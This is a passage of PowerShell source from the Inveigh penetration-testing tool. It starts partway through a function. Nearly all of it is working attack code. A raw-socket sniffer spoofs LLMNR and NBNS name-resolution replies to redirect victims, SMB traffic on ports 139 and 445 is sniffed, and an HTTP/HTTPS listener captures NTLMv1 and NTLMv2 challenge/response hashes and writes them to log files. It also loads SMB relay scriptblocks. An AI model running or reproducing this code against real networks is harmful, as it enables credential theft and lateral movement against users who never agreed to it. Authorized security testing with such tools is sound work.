                        $inveigh.console_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }                   
                    }
                    
                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.repeat))
                    {
                        $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                    }
                }
                else # NTLMv2
                {   
                    $NTLM_type = "NTLMv2"           
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                    
                    if((($NTLM_challenge -ne '') -and ($NTLM_response -ne '')) -and (($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $HTTP_NTLM_user_string.EndsWith('$')))))
                    {
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv2_file_queue.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv2_list.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $inveigh.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }
                        
                    }
                    
                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.repeat))
                    {
                        $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                    }
                }
                
                $inveigh.response.StatusCode = 200
                $NTLM_challenge = ''
                
            }
            else
            {
                $NTLM = 'NTLM'
            }
        
        }
        
        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
        $inveigh.response.ContentLength64 = $HTTP_buffer.length
        $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
        $HTTP_stream = $inveigh.response.OutputStream
        $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
        $HTTP_stream.close()
    }

    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()

}

# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
$sniffer_scriptblock = 
{
    param ($LLMNR_response_message,$NBNS_response_message,$IP,$SpooferIP,$SMB,$LLMNR,$NBNS,$NBNSTypes,$SpoofList,$MachineAccounts,$ForceWPADAuth,$RunTime)

    $byte_in = New-Object Byte[] 4	
    $byte_out = New-Object Byte[] 4	
    $byte_data = New-Object Byte[] 4096
    $byte_in[0] = 1  					
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $inveigh.sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $inveigh.sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
    $inveigh.sniffer_socket.ReceiveBufferSize = 1024
    $end_point = New-Object System.Net.IPEndpoint([Net.IPAddress]"$IP", 0)
    $inveigh.sniffer_socket.Bind($end_point)
    [void]$inveigh.sniffer_socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)

    if($RunTime)
    {    
        $sniffer_timeout = new-timespan -Minutes $RunTime
        $sniffer_stopwatch = [diagnostics.stopwatch]::StartNew()
    }

    while($inveigh.running)
    {
        $packet_data = $inveigh.sniffer_socket.Receive($byte_data,0,$byte_data.length,[Net.Sockets.SocketFlags]::None)
    
        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_data)
        $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
    
        # IP header fields
        $version_HL = $binary_reader.ReadByte()
        $type_of_service= $binary_reader.ReadByte()
        $total_length = DataToUInt16 $binary_reader.ReadBytes(2)
        $identification = $binary_reader.ReadBytes(2)
        $flags_offset = $binary_reader.ReadBytes(2)
        $TTL = $binary_reader.ReadByte()
        $protocol_number = $binary_reader.ReadByte()
        $header_checksum = [Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
        $source_IP_bytes = $binary_reader.ReadBytes(4)
        $source_IP = [System.Net.IPAddress]$source_IP_bytes
        $destination_IP_bytes = $binary_reader.ReadBytes(4)
        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
        $IP_version = [int]"0x$(('{0:X}' -f $version_HL)[0])"
        $header_length = [int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($protocol_number)
        {
            6 
            {  # TCP
                $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $ack_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $TCP_header_length = [int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                $TCP_flags = $binary_reader.ReadByte()
                $TCP_window = DataToUInt16 $binary_reader.ReadBytes(2)
                $TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
                $TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)    
                $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))

                switch ($destination_port)
                {
                    139 
                    {
                        if($SMB -eq 'y')
                        {
                            SMBNTLMResponse $payload_bytes
                        }
                    }
                    445
                    { 
                        if($SMB -eq 'y')
                        {
                            SMBNTLMResponse $payload_bytes
                        }
                    }
                }

                # Outgoing packets
                switch ($source_port)
                {
                    139 
                    {
                        if($SMB -eq 'y')
                        {   
                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                        }
                    }
                    445 
                    {
                        if($SMB -eq 'y')
                        {   
                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                        }
                    }
                }
            }       
            17 
            {  # UDP
                $source_port =  $binary_reader.ReadBytes(2)
                $endpoint_source_port = DataToUInt16 ($source_port)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_uint  = DataToUInt16 ($UDP_length)
                [void]$binary_reader.ReadBytes(2)
                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)

                # Incoming packets 
                switch ($destination_port)
                {
                    137 # NBNS
                    { 
                        if($payload_bytes[5] -eq 1 -and $IP -ne $source_IP)
                        {
                            $UDP_length[0] += 16
                        
                            [Byte[]]$NBNS_response_data = $payload_bytes[13..$payload_bytes.length]`
                                + (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)`
                                + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()`
                                + (0x00,0x00,0x00,0x00)
                
                            [Byte[]]$NBNS_response_packet = (0x00,0x89)`
                                + $source_port[1,0]`
                                + $UDP_length[1,0]`
                                + (0x00,0x00)`
                                + $payload_bytes[0,1]`
                                + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
                                + $NBNS_response_data
                
                            $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                            $send_socket.SendBufferSize = 1024
                            $destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
                    
                            $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                    
                            switch ($NBNS_query_type)
                            {
                                '41-41' {
                                    $NBNS_query_type = '00'
                                }
                                '41-44' {
                                    $NBNS_query_type = '03'
                                }
                                '43-41' {
                                    $NBNS_query_type = '20'
                                }
                                '42-4C' {
                                    $NBNS_query_type = '1B'
                                }
                                '42-4D' {
                                $NBNS_query_type = '1C'
                                }
                                '42-4E' {
                                $NBNS_query_type = '1D'
                                }
                                '42-4F' {
                                $NBNS_query_type = '1E'
                                }
                            }

                            $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
                            $NBNS_query = $NBNS_query -replace "-00",""
                            $NBNS_query = $NBNS_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                        
                            $NBNS_query_string_subtracted = ""
                            $NBNS_query_string = ""
                        
                            $n = 0
                            
                            do
                            {
                                $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
                                $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
                                $n += 1
                            }
                            until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    
                            $n = 0
                    
                            do
                            {
                                $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
                                $n += 2
                            }
                            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.length -eq 15)

                            if($NBNS -eq 'y')
                            {
                                if($NBNSTypes -contains $NBNS_query_type)
                                { 
                                    if ((!$Spooflist -or $SpoofList -contains $NBNS_query_string) -and $inveigh.IP_capture_list -notcontains $source_IP)
                                    {
                                        [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
                                        $send_socket.Close()
                                        $NBNS_response_message = "- spoofed response has been sent"
                                    }
                                    else
                                    {
                                        if($SpoofList -notcontains $NBNS_query_string)
                                        {
                                            $NBNS_response_message = "- $NBNS_query_string not on spoof list"
                                        }
                                        else
                                        {
                                            $NBNS_response_message = "- spoof suppressed due to previous capture"
                                        }
                                    }
                                }
                                else
                                {
                                    $NBNS_response_message = "- spoof not sent due to disabled type"
                                }
                            }

                            $inveigh.console_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                            $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
                        }
                    }
                    5355 # LLMNR
                    { 
                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.length - 4)..($payload_bytes.length - 3)]) -ne '00-1c') # ignore AAAA for now
                        {
                            $UDP_length[0] += $payload_bytes.length - 2

                            [byte[]]$LLMNR_response_data = $payload_bytes[12..$payload_bytes.length]
                                $LLMNR_response_data += $LLMNR_response_data`
                                + (0x00,0x00,0x00,0x1e)`
                                + (0x00,0x04)`
                                + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
            
                            [byte[]]$LLMNR_response_packet = (0x14,0xeb)`
                                + $source_port[1,0]`
                                + $UDP_length[1,0]`
                                + (0x00,0x00)`
                                + $payload_bytes[0,1]`
                                + (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)`
                                + $LLMNR_response_data
            
                            $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                            $send_socket.SendBufferSize = 1024
                            $destination_point = New-Object Net.IPEndpoint($source_IP, $endpoint_source_port)
     
                            $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
                            $LLMNR_query = $LLMNR_query -replace "-00",""
                            $LLMNR_query = $LLMNR_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                            $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
                
                            if($LLMNR -eq 'y')
                            {
                                if((!$Spooflist -or $SpoofList -contains $LLMNR_query_string) -and $inveigh.IP_capture_list -notcontains $source_IP)
                                {
                                    [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
                                    $send_socket.Close( )
                                    $LLMNR_response_message = "- spoofed response has been sent"
                                }
                                else
                                {
                                    if($SpoofList -notcontains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string not on spoof list"
                                    }
                                    else
                                    {
                                        $LLMNR_response_message = "- spoof suppressed due to previous capture"
                                    }
                                }
                            }
             
                            $inveigh.console_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                            $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
                        }
                    }
                }
            }
        }

        if($RunTime)
        {    
            if($sniffer_stopwatch.elapsed -ge $sniffer_timeout)
            {

                if($inveigh.HTTP_listener.IsListening)
                {
                    $inveigh.HTTP_listener.Stop()
                    $inveigh.HTTP_listener.Close()
                }

                $inveigh.console_queue.add("Inveigh auto-exited at $(Get-Date -format 's')")
                $inveigh.log.add("$(Get-Date -format 's') - Inveigh auto-exited")

                if($inveigh.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh auto-exited"| Out-File $Inveigh.log_out_file -Append
                } 
    
                if($inveigh.HTTPS)
                {
                    Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
        
                    try
                    {
                        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                        $certificate_store.Open('ReadWrite')
                        $certificate = $certificate_store.certificates.find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
                        $certificate_store.Remove($certificate)
                        $certificate_store.Close()
                    }
                    catch
                    {
                        if($inveigh.status_output)
                        {
                            $inveigh.console_queue.add("SSL Certificate Deletion Error - Remove Manually")
                        }

                        $inveigh.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")

                        if($inveigh.file_output)
                        {
                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"| Out-File $Inveigh.log_out_file -Append   
                        }
                    }
                }

                $inveigh.HTTP = $false
                $inveigh.HTTPS = $false
                $inveigh.running = $false
                $inveigh.relay_running = $false

            }
        }

        if($inveigh.file_output)
        {
            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
            }
        }
    }

    $binary_reader.Close()
    $memory_stream.Dispose()
    $memory_stream.Close()

}

# End ScriptBlocks
# Begin Startup Functions

# HTTP/HTTPS Listener Startup Function 
Function HTTPListener()
{
    $inveigh.HTTP_listener = New-Object System.Net.HttpListener

    if($inveigh.HTTP)
    {
        $inveigh.HTTP_listener.Prefixes.Add('http://*:80/')
    }

    if($inveigh.HTTPS)
    {
        $inveigh.HTTP_listener.Prefixes.Add('https://*:443/')
    }

    $inveigh.HTTP_listener.AuthenticationSchemes = "Anonymous" 
    $inveigh.HTTP_listener.Start()
    $HTTP_runspace = [runspacefactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [powershell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_challenge_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($MachineAccounts).AddArgument($ForceWPADAuth) > $null
    $HTTP_handle = $HTTP_powershell.BeginInvoke()
}

# Sniffer/Spoofer Startup Function
Function SnifferSpoofer()
{
    $sniffer_runspace = [runspacefactory]::CreateRunspace()
    $sniffer_runspace.Open()
    $sniffer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $sniffer_powershell = [powershell]::Create()
    $sniffer_powershell.Runspace = $sniffer_runspace
    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($LLMNR_response_message).AddArgument(
        $NBNS_response_message).AddArgument($IP).AddArgument($SpooferIP).AddArgument($SMB).AddArgument(
        $LLMNR).AddArgument($NBNS).AddArgument($NBNSTypes).AddArgument($SpoofList).AddArgument(
        $MachineAccounts).AddArgument($ForceWPADAuth).AddArgument($RunTime) > $null
    $sniffer_handle = $sniffer_powershell.BeginInvoke()
}

# End Startup Functions

# Startup Enabled Services

# HTTP Server Start
if(($inveigh.HTTP -or $inveigh.HTTPS) -and $SMBRelay -eq 'n')
{
    HTTPListener
}

# Sniffer/Spoofer Start - always enabled
SnifferSpoofer

if($inveigh.console_output)
{
    :console_loop while(($inveigh.running) -and ($inveigh.console_output))
    {
        while($inveigh.console_queue.Count -gt 0)
        {
            if($inveigh.output_stream_only)
            {
                write-output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard ($inveigh.console_queue[0])
                {
                    "*local administrator*"
                    {
                        write-warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "*NTLMv1 challenge/response written*"
                    {
                    if($inveigh.file_output)
                    {
                        write-warning $inveigh.console_queue[0]
                    }
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "*NTLMv2 challenge/response written*"
                    {
                    if($inveigh.file_output)
                    {
                        write-warning $inveigh.console_queue[0]
                    }
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "* relay *"
                    {
                        write-warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    "Service *"
                    {
                        write-warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }

        if($inveigh.console_input)
        {
            if([console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }
        }

        Start-Sleep -m 5
    }
}

}
